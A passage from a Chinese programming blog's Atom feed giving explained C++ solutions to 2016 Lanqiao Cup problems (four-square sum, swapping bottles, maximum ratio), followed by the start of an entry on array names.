class="string">&quot; &quot;</span>&lt;&lt;i2&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;i3&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;i4&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>思路二</strong>：二分法</li></ul><p>实际上这是二分法的一个变种，大致思路是先枚举可能的c和d，将 $c<sup>2+d</sup>2$存起来降低时间复杂度并排序，然后枚举a和b再二分查找c和d的平方和</p><p>代码来源：<a href="https://blog.csdn.net/weixin_46239370/article/details/105411924">第七届蓝桥杯 ——四平方和</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2500010</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Sum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> s, c, d;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Sum &amp;t) <span class="keyword">const</span>  <span class="comment">//重载小于号</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s != t.s) <span class="keyword">return</span> s &lt; t.s;</span><br><span class="line">        <span class="keyword">if</span>(c != t.c) <span class="keyword">return</span> c &lt; t.c;</span><br><span class="line">        <span class="keyword">return</span> d &lt; t.d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;p[N];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c * c &lt;= n; c ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> d = c; c * c + d * d &lt;= n; d ++)</span><br><span class="line">            p[k ++] = &#123;c * c + d * d, c, d&#125;;</span><br><span class="line">            </span><br><span class="line">    <span class="built_in">sort</span>(p, p + k);        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a * a &lt;= n; a ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> b = a; a * a + b * b &lt;= n; b ++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> t = n - a * a - b * b;</span><br><span class="line">            <span class="keyword">int</span> l = <span class="number">0</span>, r = k - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l &lt; r) <span class="comment">//二分思想</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>; <span class="comment">//除2</span></span><br><span class="line">                <span class="keyword">if</span>(p[mid].s &gt;= t) </span><br><span class="line">                    r = mid;  <span class="comment">//找到第一个大于等于 t 的位置</span></span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p[l].s == t)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>, a, b, p[l].c, p[l].d);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>9.交换瓶子</h1><p>有N个瓶子，编号 1 ~ N，放在架子上。</p><p>比如有5个瓶子：2 1 3 5 4</p><p>要求每次拿起2个瓶子，交换它们的位置。经过若干次后，使得瓶子的序号为：1 2 3 4 5</p><p>对于这么简单的情况，显然，至少需要交换2次就可以复位。</p><p>如果瓶子更多呢？你可以通过编程来解决。</p><p>输入格式为两行：第一行: 一个正整数N（N&lt;10000）, 表示瓶子的数目第二行：N个正整数，用空格分开，表示瓶子目前的排列情况。</p><p>输出数据为一行一个正整数，表示至少交换多少次，才能完成排序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">例如，输入：</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">2</span> <span class="number">5</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line">程序应该输出：</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">再例如，输入：</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">程序应该输出：</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li><strong>思路一</strong>：找规律</li></ul><p>本以为放在第九题会用到稍微复杂点的算法，后来发现不是</p><p>刚开始没有思路，后来经过观察发现，比如5 4 3 2 1，这里nums[1]=5，而nums[5]刚好等于1，这样相当于交换1次</p><p>又如3 1 2 5 4，nums[1]=3，而nums[3]=2，nums[2]=1，你应该发现规律了，从1出发找nums[i]和i不等就接着往下找直到找到nums[x]=i</p><p>这里3、1、2进行两次交换就可以，5和4进行1次交换就可以</p><blockquote><p>看网上的题解大多都是思路二那种直接swap，可能我脑回路比较奇特吧 😹</p></blockquote><p>本题在线OJ：<a href="https://www.acwing.com/problem/content/1226/">1224. 交换瓶子</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> N,res;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin&gt;&gt;N;</span><br><span class="line">    <span class="keyword">int</span> nums[N+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">bool</span> visited[N+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">        cin&gt;&gt;nums[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> m=i,n=i;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(n!=nums[m])  <span class="comment">//若当前位置的nums不等于起始的i</span></span><br><span class="line">                &#123;</span><br><span class="line">                    visited[m]=<span class="number">1</span>; <span class="comment">//标记成已访问</span></span><br><span class="line">                    m=nums[m];    <span class="comment">//把nums[m]赋值给m,如示例中的m=nums[1]=3，然后if判断n是否等于nums[3]</span></span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    visited[m]=<span class="number">1</span>;   <span class="comment">//注意如果n和nums[m]相等要把m也标记下，避免重复计算</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>思路二</strong>：暴力枚举swap</li></ul><p>这是看别人题解的方法，思路一其实并没有交换数据只是求了下结果，也可以对于位置i，遍历之后的数找到j使得nums[j]=i，然后交换nums[i]和nums[j]</p><p>该题解原地址：<a href="https://www.acwing.com/solution/content/6983/">AcWing 1224. 交换瓶子</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">10010</span>;</span><br><span class="line"><span class="keyword">int</span> a[N],n,t;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)  <span class="comment">//遍历i+1到n找到a[j]和i相等然后a[i]和a[j]交换</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[j]==i)</span><br><span class="line">                &#123;</span><br><span class="line">                   <span class="built_in">swap</span>(a[i],a[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>10.最大比例</h1><p>X星球的某个大奖赛设了M级奖励。每个级别的奖金是一个正整数。并且，相邻的两个级别间的比例是个固定值。也就是说：所有级别的奖金数构成了一个等比数列。比如：16,24,36,54其等比值为：3/2</p><p>现在，我们随机调查了一些获奖者的奖金数。请你据此推算可能的最大的等比值。</p><p>输入格式：第一行为数字N，表示接下的一行包含N个正整数第二行N个正整数Xi(Xi&lt;1 000 000 000 000)，用空格分开。每个整数表示调查到的某人的奖金数额</p><p>要求输出：一个形如A/B的分数，要求A、B互质。表示可能的最大比例系数</p><p>测试数据保证了输入格式正确，并且最大比例是存在的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">例如，输入：</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1250</span> <span class="number">200</span> <span class="number">32</span></span><br><span class="line"></span><br><span class="line">程序应该输出：</span><br><span class="line"><span class="number">25</span>/<span class="number">4</span></span><br><span class="line"></span><br><span class="line">再例如，输入：</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3125</span> <span class="number">32</span> <span class="number">32</span> <span class="number">200</span></span><br><span class="line"></span><br><span class="line">程序应该输出：</span><br><span class="line"><span class="number">5</span>/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">再例如，输入：</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">549755813888</span> <span class="number">524288</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">程序应该输出：</span><br><span class="line"><span class="number">4</span>/<span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><strong>思路一</strong>：转化为求相邻比值的最大公约数。</li></ul><p>思路来源：<a href="https://harris.blog.csdn.net/article/details/109114586?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;dist_request_id=1331645.97.16183170165922727&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control">2016蓝桥杯省赛第十题：最大比例</a></p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210413214439279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>网上很多用的辗转相减法，但基本都没有具体解释，这里给出我自己的理解</p><p>先解释下代码：大致思路就是先排序，然后每个数除第一个数约分成一个不能再约分的分数保存起来</p><p>对这些分数的分子和分母依次用辗转相减法，注意并不是求他们的最大公约数</p><p>举个 🌰 ，第二个示例中，先排序得到32、32、200、3125，然后用每个数除第一个数得到不能再约分的分数(注意去重)</p><p>即$25/4$和$3125/32$，然后对得到的每个分数的分子和分母的指数求最大公约数</p><p>如4和32不是求4和32的最大公约数，而是4=$2<sup>2$，32=$2</sup>5$。它们的指数分别为2和5，对2和5求最大公约数即1则函数返回$2<sup>1$，对应上图解释中的返回$p</sup>k$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">110</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">LL x[N],a[N],b[N];</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">gcd</span><span class="params">(LL a,LL b)</span><span class="comment">//求最大公约数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b?<span class="built_in">gcd</span>(b,a%b):a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">gcd_sub</span><span class="params">(LL a,LL b)</span><span class="comment">//辗转相减，返回p的k次方</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b&gt;a)</span><br><span class="line">        <span class="built_in">swap</span>(a,b);</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">gcd_sub</span>(b,a/b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        cin&gt;&gt;x[i];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(x,x+n);</span><br><span class="line"></span><br><span class="line">    LL dd=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(x[i]!=x[i<span class="number">-1</span>])<span class="comment">//去重</span></span><br><span class="line">        &#123;</span><br><span class="line">            dd =<span class="built_in">gcd</span>(x[i],x[<span class="number">0</span>]);<span class="comment">//最大公约数</span></span><br><span class="line">            a[cnt] = x[i]/dd;</span><br><span class="line">            b[cnt] = x[<span class="number">0</span>]/dd;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LL up = a[<span class="number">0</span>],down = b[<span class="number">0</span>];<span class="comment">//up分子 down分母</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;cnt;i++)<span class="comment">//分开求分子分母的指数最大公约数</span></span><br><span class="line">    &#123;</span><br><span class="line">        up = <span class="built_in">gcd_sub</span>(up,a[i]);</span><br><span class="line">        down = <span class="built_in">gcd_sub</span>(down,b[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;up&lt;&lt;<span class="string">&quot;/&quot;</span>&lt;&lt;down;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的辗转相减法是基于原本思想的一个变形，真正的辗转相减法(更相减损术)代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个是求最大公约数的</span></span><br><span class="line"><span class="function">ll <span class="title">gcd</span><span class="params">(ll a,ll b)</span>   </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a==b) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?<span class="built_in">gcd</span>(a-b,b):<span class="built_in">gcd</span>(b-a,a); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>思路二</strong>：分数相除</li></ul><p>思想来源：<a href="https://blog.csdn.net/qq_33245342/article/details/54696173?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control&amp;dist_request_id=1331645.1292.16183210145613977&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control">2016蓝桥杯A组第十题 最大比例</a></p><p>这也是一种方法，比较独特，这里贴上这位博主的解释，自行理解吧</p><p>先对输入数据排序，然后依次用后一个除以前一个得到比例，当然这个比例要用结构体表示（分子，分母），将所有比例保存下来</p><p>对比例排序，然后用后一个比例除以前一个比例，更新后一个比例为所求值</p><p>所有比例遍历完，对比例排序，按照相同的操作循环，直到前面所有比例为1：1，最后一个比例即为所求比例；</p><p>说起来有点抽象，举个例子，假如所求比例为t,比例数组 1 ,t<sup>2,t,t</sup>6,t^3，排序之后 1，t<sup>2,t</sup>3,t^6</p><p>相邻比例相除：1,t<sup>2,t,t</sup>5，排序：1，t,t<sup>2,t</sup>5;比例相除：1，t,t,t<sup>4;再相除：1，t,1,t</sup>4…</p><p>最终会得到1，1，1，t;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">gcd</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a%b ? <span class="built_in">gcd</span>(b, a%b) : b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bili</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> fenzi;</span><br><span class="line">    <span class="keyword">int</span> fenmu;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(bili&amp;t)<span class="keyword">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> fenzi*<span class="number">1.0</span> / fenmu &lt; t.fenzi*<span class="number">1.0</span> / t.fenmu;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;n[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> count, i;</span><br><span class="line">    cin &gt;&gt; count;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++)</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    <span class="built_in">sort</span>(a, a +count);</span><br><span class="line">    <span class="keyword">for</span> (i = count - <span class="number">1</span>;i &gt; <span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> t = <span class="built_in">gcd</span>(a[i], a[i - <span class="number">1</span>]);</span><br><span class="line">        n[i - <span class="number">1</span>].fenzi = a[i] / t, n[i - <span class="number">1</span>].fenmu = a[i - <span class="number">1</span>] / t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(n, n + count - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; count - <span class="number">2</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> t = <span class="built_in">gcd</span>(n[i + <span class="number">1</span>].fenzi *n[i].fenmu, n[i + <span class="number">1</span>].fenmu*n[i].fenzi);</span><br><span class="line">            n[i + <span class="number">1</span>].fenzi = n[i + <span class="number">1</span>].fenzi *n[i].fenmu / t;</span><br><span class="line">            n[i + <span class="number">1</span>].fenmu = n[i + <span class="number">1</span>].fenmu *n[i].fenzi / t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(n, n + count - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; n[i].fenzi == <span class="number">1</span>;i++);</span><br><span class="line">        <span class="keyword">if</span> (i == count - <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; n[count - <span class="number">2</span>].fenzi &lt;&lt; <span class="string">&#x27;/&#x27;</span> &lt;&lt; n[count - <span class="number">2</span>].fenmu;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;1.煤球数目&lt;/h1&gt;
&lt;p&gt;有一堆煤球，堆成三角棱锥形。具体：第一层放1个，第二层3个（排列成三角形），第三层6个（排列成三角形），第四层10个（排列成三角形），…如果一共有100层，共有多少个煤球？&lt;/p&gt;
&lt;p&gt;请填表示煤球总数目的数字。注意：你提交的应该是一个整数</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>一维数组名和二维数组名的区别</title>
    <link href="https://zss192.github.io/2021/04/12/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E5%90%8D%E5%92%8C%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E5%90%8D%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
